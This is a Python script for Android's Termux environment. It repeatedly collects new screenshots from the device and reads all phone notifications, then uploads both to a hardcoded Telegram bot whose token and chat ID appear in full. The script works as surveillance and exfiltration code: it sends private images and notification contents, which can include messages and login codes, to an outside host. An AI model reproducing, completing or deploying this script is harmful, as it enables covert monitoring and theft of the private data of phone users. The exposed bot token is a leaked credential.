import os
import time
import requests
import subprocess
from datetime import datetime

# Telegram Bot API settings
TELEGRAM_API_URL = "https://api.telegram.org/bot7762660744:AAHCxlWJvkwnI9ACKDX_zim2G8FEQa1_Drk"
CHAT_ID = "5928551879"

# Directory where screenshots are saved
SCREENSHOT_DIR = "/storage/emulated/0/Pictures/Screenshots/"
# Log file to track sent screenshots
LOG_FILE = "sent_screenshots.log"

def is_online():
    """Check if the device is online."""
    try:
        requests.get("https://www.google.com", timeout=5)
        return True
    except requests.RequestException:
        return False

def send_telegram_message(message):
    """Send a message to the Telegram bot."""
    data = {
        'chat_id': CHAT_ID,
        'text': message,
    }
    try:
        response = requests.post(f"{TELEGRAM_API_URL}/sendMessage", data=data)
        return response.json()
    except requests.RequestException:
        return None

def send_telegram_photo(photo_path):
    """Send a photo to the Telegram bot."""
    with open(photo_path, 'rb') as photo:
        files = {'document': photo}
        data = {'chat_id': CHAT_ID}
        try:
            response = requests.post(f"{TELEGRAM_API_URL}/sendDocument", data=data, files=files)
            return response.json()
        except requests.RequestException:
            return None

def get_screenshots():
    """Get all screenshot files from the screenshot directory."""
    screenshots = []
    for root, dirs, files in os.walk(SCREENSHOT_DIR):
        for file in files:
            if file.lower().endswith(('.png', '.jpg', '.jpeg')):
                screenshots.append(os.path.join(root, file))
    return screenshots

def get_sent_screenshots():
    """Retrieve the list of already sent screenshots."""
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, 'r') as f:
            return set(f.read().splitlines())
    return set()

def update_sent_screenshots(screenshot_path):
    """Update the log file with a newly sent screenshot."""
    with open(LOG_FILE, 'a') as f:
        f.write(screenshot_path + "\n")

def handle_get_command():
    """Send all screenshots again when the /get command is received."""
    screenshots = get_screenshots()
    if screenshots:
        for screenshot in screenshots:
            send_telegram_photo(screenshot)
    send_telegram_message("All screenshots have been sent again.")

def capture_notifications():
    """Capture notifications using termux-notification-list."""
    try:
        result = subprocess.check_output(['termux-notification-list'], stderr=subprocess.STDOUT)
        notifications = result.decode('utf-8').splitlines()

        message = "Notifications:\n\n"
        for notification in notifications:
            # Simplify the format to extract details like app name, title, and text
            if "App:" in notification and "Title:" in notification and "Text:" in notification:
                message += f"{notification}\n\n"

        # Send notifications to Telegram if any exist
        if message.strip() != "Notifications:\n\n":
            send_telegram_message(message)
            print("Sending notifications to Telegram.")

    except subprocess.CalledProcessError as e:
        print(f"Error capturing notifications: {e.output.decode()}")

def main():
    sent_screenshots = get_sent_screenshots()
    while True:
        if is_online():
            print("Device is online. Starting process...")

            # Capture notifications every 5 minutes
            capture_notifications()

            # Check for new screenshots
            screenshots = get_screenshots()
            new_screenshots = [s for s in screenshots if s not in sent_screenshots]

            if new_screenshots:
                for screenshot in new_screenshots:
                    send_telegram_photo(screenshot)
                    sent_screenshots.add(screenshot)
                    update_sent_screenshots(screenshot)
                    print(f"Sending to Telegram: {screenshot}")

            # Listen for /get command (placeholder for actual implementation)
            # Replace this section with an actual Telegram bot handler.
            command = input("Enter command (/get to resend all screenshots): ").strip()
            if command == "/get":
                handle_get_command()
        else:
            print("Device is offline. Pausing and checking every 5 minutes...")
            time.sleep(300)  # Check every 5 minutes

if __name__ == "__main__":
    main()
